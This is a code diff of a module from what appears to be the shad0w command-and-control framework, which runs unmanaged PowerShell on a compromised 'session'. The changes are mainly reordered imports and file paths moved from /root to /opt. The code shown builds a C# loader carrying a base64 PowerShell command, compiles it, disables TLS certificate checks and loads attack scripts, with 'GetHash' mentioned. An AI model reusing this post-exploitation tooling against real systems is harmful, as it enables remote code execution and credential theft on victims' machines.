@@ -2,13 +2,12 @@
 # Run unmanaged powershell on a session
 #
 
-import os
-import sys
-import string
-import random
-import base64
 import argparse
-
+import base64
+import os
+import random
+import string
+import sys
 from lib import shellcode
 
 __description__ = "Run unmanaged powershell on a session"
@@ -18,7 +17,7 @@ __author__ = "@_batsec_"
 USERCD_EXEC_ID = 0x3000
 
 # location of psh binary
-PSH_BIN = "/root/shad0w/modules/windows/psh/build/psh.exe"
+PSH_BIN = "/opt/shad0w/modules/windows/psh/build/psh.exe"
 
 # did the command error
 ERROR = False
@@ -71,14 +70,14 @@ def random_string():
     return rstring
 
 def do_copy():
-    os.system("cp /root/shad0w/modules/windows/psh/*.cs /root/shad0w/modules/windows/psh/build")
-    os.system("cp /root/shad0w/modules/windows/psh/*.dll /root/shad0w/modules/windows/psh/build")
+    os.system("cp /opt/shad0w/modules/windows/psh/*.cs /opt/shad0w/modules/windows/psh/build")
+    os.system("cp /opt/shad0w/modules/windows/psh/*.dll /opt/shad0w/modules/windows/psh/build")
 
 def write_args(pwsh):
     do_copy()
 
     new_file = ""
-    with open("/root/shad0w/modules/windows/psh/build/main.cs", "r") as file:
+    with open("/opt/shad0w/modules/windows/psh/build/main.cs", "r") as file:
         data = file.read()
 
     for line in data.splitlines():
@@ -86,13 +85,13 @@ def write_args(pwsh):
             line = f"            string b64_cmd = \"{pwsh}\";"
         new_file += line + '\n'
 
-    with open("/root/shad0w/modules/windows/psh/build/main.cs", "w") as file:
+    with open("/opt/shad0w/modules/windows/psh/build/main.cs", "w") as file:
         file.write(new_file)
 
 def compile_binary():
     cwd = os.getcwd()
 
-    os.chdir("/root/shad0w/modules/windows/psh/build/")
+    os.chdir("/opt/shad0w/modules/windows/psh/build/")
     os.system("mcs /reference:System.Management.Automation.dll -out:psh.exe main.cs")
     os.chdir(cwd)
 
@@ -152,7 +151,7 @@ psh --info GetHash
     psh_args = ""
 
     if args.info:
-        basedir = "/root/shad0w/scripts/"
+        basedir = "/opt/shad0w/scripts/"
         args.info = args.info + ".ps1"
         if args.info not in os.listdir(basedir):
             shad0w.debug.error(f"No module with name '{args.info}'")
@@ -161,7 +160,7 @@ psh --info GetHash
         return
 
     if args.list:
-        modules = os.listdir("/root/shad0w/scripts")
+        modules = os.listdir("/opt/shad0w/scripts")
         shad0w.debug.log(f"{len(modules)} available modules\n", log=True)
         for module in modules:
             print("-\t", module.replace(".ps1", ""))
@@ -174,7 +173,7 @@ psh --info GetHash
         psh_args += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; "
 
         for module in modules:
-            module_path = f"/root/shad0w/scripts/{module}.ps1"
+            module_path = f"/opt/shad0w/scripts/{module}.ps1"
 
             with open(module_path, "r") as file:
                 mod_data = file.read()
